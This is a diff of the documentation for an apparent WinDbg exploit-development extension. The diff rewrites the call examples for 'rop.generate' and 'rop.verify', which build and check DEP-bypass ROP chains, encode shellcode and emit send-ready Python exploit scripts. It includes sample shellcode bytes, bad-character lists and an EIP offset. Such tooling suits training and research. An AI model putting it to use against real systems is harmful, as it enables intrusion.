@@ -138,8 +138,8 @@ dd 0x1005D060  ->  76e25680      (*slot == target)
 
 | You have… | ASLR? | PUSHAD gadget? | Use | First arg you pass |
 |-----------|-------|----------------|-----|--------------------|
-| **everything** (want one command) | yes | — | **`rop.generate`** | `{api: "auto", …}` or `{api: "VirtualAlloc", …}` |
-| **verify a chain** (read-only) | — | — | **`rop.verify`** | `{badchars: "00 0A 0D"}` or `{chain: "ADDR1 ADDR2 …"}` |
+| **everything** (want one command) | yes | — | **`rop.generate`** | `"auto"` or `"VirtualAlloc"` |
+| **verify a chain** (read-only) | — | — | **`rop.verify`** | `"", "00 0A 0D"` or `"ADDR1 ADDR2 …"` |
 | a **slot** (want reboot-stable) | yes | — | **`rop.slot_call`** | the **slot** |
 | the **target** address | no / one-shot | yes | `rop.chain_va` / `chain_vp` / `chain_wpm` / `chain_lla` / `chain_gpa` | the **target** |
 | the **target** address | no / one-shot | no | `rop.frame_va` / `frame_vp` / `frame_wpm` / `frame_lla` / `frame_gpa` | the **target** |
@@ -383,26 +383,26 @@ dx @$osed().rop.frame_write("0x00420000",
 word0 = target (ret dispatches into it), word1 = post-call target, then args.
 Null words are synthesised in a register and stored.
 
-### `rop.generate({api, shellcode?, badchars?, …})` — one-command full exploit
+### `rop.generate(api, shellcode?, badchars?, module?, offset?)` — one-command full exploit
 
 ```js
 // Auto-select best API — enumerates all candidates, scores by IAT availability and badchars
-dx @$osed().rop.generate({api: "auto", badchars: "00 0A 0D", module: "MSA2Mfilter03", offset: 780})
+dx @$osed().rop.generate("auto", "", "00 0A 0D", "MSA2Mfilter03", 780)
 
 // Explicit API — auto-discovers IAT slot, buffer, return gadget
-dx @$osed().rop.generate({api: "VirtualAlloc", shellcode: "FC E8 82 00 00 00 60", badchars: "00 0A 0D", module: "MSA2Mfilter03", offset: 780})
+dx @$osed().rop.generate("VirtualAlloc", "FC E8 82 00 00 00 60", "00 0A 0D", "MSA2Mfilter03", 780)
 
-// Override auto-discovery with known addresses
-dx @$osed().rop.generate({api: "VirtualProtect", iatSlot: 0x1005D060, buf: "0x00420000", retAddr: "0x10022D64", badchars: "00 0A 0D", offset: 780, entrySkew: 0})
+// Generate with the default discovery inputs
+dx @$osed().rop.generate("VirtualProtect")
 ```
 
 Orchestrates existing primitives into one call:
 
-1. **API selection** — `api: "auto"` enumerates all DEP-bypass APIs, discovers IAT slots, scores each candidate (IAT presence, badchar-free slot address, argument count, preference), and selects the best with a reason. Pass an explicit API name to override.
-2. **IAT slot** — auto-discovered via `sc.iat_find(api)`, or pass `iatSlot`.
-3. **Writable buffer** — auto-discovered via `code_caves(module)`, or pass `buf`.
-4. **Return gadget** — searches the corpus for `jmp esp`, or pass `retAddr`.
-5. **Writable out-param** — derived from `buf + 0x100`, or pass `writable`.
+1. **API selection** — `"auto"` enumerates all DEP-bypass APIs, discovers IAT slots, scores each candidate (IAT presence, badchar-free slot address, argument count, preference), and selects the best with a reason. Pass an explicit API name to override.
+2. **IAT slot** — auto-discovered via `sc.iat_find(api)`.
+3. **Writable buffer** — auto-discovered via `code_caves(module)`.
+4. **Return gadget** — searches the corpus for `jmp esp`.
+5. **Writable out-param** — derived from the discovered buffer.
 6. **ROP chain** — calls `slot_call` internally with the correct stdcall frame.
 7. **Shellcode encoding** — XOR-encodes with `encode()` using `badchars`.
 8. **Python exploit** — emits a complete send-ready script with all of the above.
@@ -417,27 +417,22 @@ Supported APIs: `VirtualProtect`, `VirtualAlloc`, `WriteProcessMemory`,
 | `badchars` | hex string | — | Bad characters (e.g. `"00 0A 0D"`) |
 | `module` | string | — | Module filter for `code_caves` auto-discovery |
 | `offset` | number | — | EIP offset for the Python payload padding |
-| `iatSlot` | number | auto | IAT slot address (overrides auto-discovery) |
-| `buf` | string/number | auto | Writable buffer address (overrides auto-discovery) |
-| `retAddr` | string/number | auto | Post-call return address (overrides `jmp esp` search) |
-| `writable` | number | `buf+0x100` | Writable dword for API out-params |
-| `entrySkew` | number | `0` | Bytes the vuln's `ret N` adds past saved EIP |
 
 Reports honestly: warns when auto-discovery fails (no IAT entry, no code caves,
 no `jmp esp` in corpus) and prints what to supply manually. The output Python
 script has TODO comments for any unresolved placeholder.
 
-### `rop.verify({chain?, badchars?, api?})` — chain verifier
+### `rop.verify(chain?, badchars?, api?)` — chain verifier
 
 ```js
 // Verify the last rop.generate result
 dx @$osed().rop.verify()
 
 // Verify with explicit badchars
-dx @$osed().rop.verify({badchars: "00 0A 0D"})
+dx @$osed().rop.verify("", "00 0A 0D")
 
 // Verify a manually supplied chain (space-separated hex DWORDs)
-dx @$osed().rop.verify({chain: "10022D64 1005D060 DEADBEEF 41414141", badchars: "00 0A 0D"})
+dx @$osed().rop.verify("10022D64 1005D060 DEADBEEF 41414141", "00 0A 0D")
 ```
 
 Read-only analysis — **never modifies the chain**. Reports in two sections:
